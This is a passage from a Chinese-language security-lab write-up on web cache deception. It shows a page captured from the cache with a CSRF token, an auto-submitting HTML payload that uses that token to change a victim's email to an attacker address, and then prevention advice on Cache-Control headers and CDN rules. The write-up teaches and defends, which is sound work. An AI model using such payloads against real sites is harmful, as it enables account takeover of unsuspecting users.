                        <form class="login-form" name="change-email-form" action="/my-account/change-email" method="POST">
                            <label>Email</label>
                            <input required type="email" name="email" value="">
                            <input required type="hidden" name="csrf" value="tsyhI4TwiW7lShuJh2MS7JIATgHcR4Od">
                            <button class='button' type='submit'> Update email </button>
                        </form>
                        <script src='/resources/js/validateSession.js'></script>
                        <script>validateSession("/login")</script>
... omit ...
</html>

```



再次修改 payload 传给受害者，携带上 csrf 值在自动提交修改邮箱 ：

```html
<html>
    <body>
        <form action="https://0a9900bc03c9787c81ee57a500e7009c.web-security-academy.net/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="pwned@evil-user.net" />
            <input required type="hidden" name="csrf" value="tsyhI4TwiW7lShuJh2MS7JIATgHcR4Od">
        </form>
        <script>
            document.forms[0].submit();  // 页面加载后自动提交表单
        </script>
    </body>
</html>
```







## 预防

可以参考如下步骤预防 Web 缓存欺骗攻击：

* 总是使用 `Cache-Control` headers 标记动态请求资源，设置对应值为 `no-store` 和 `private`。

- 检查 CDN 的设置，确保缓存规则不会覆盖 `Cache-Control` header。
- 激活 CDN 上针对 Web 缓存欺骗的任何防护，很多 CDNs 使你能够设置缓存规则来验证 response 的 `Content-Type` 匹配 请求 URL 的文件扩展名。例如 Cloudflare 的 Cache Deception Armor。
- 核对源服务器和缓存服务器之间没有解析 URL 路径的差异。







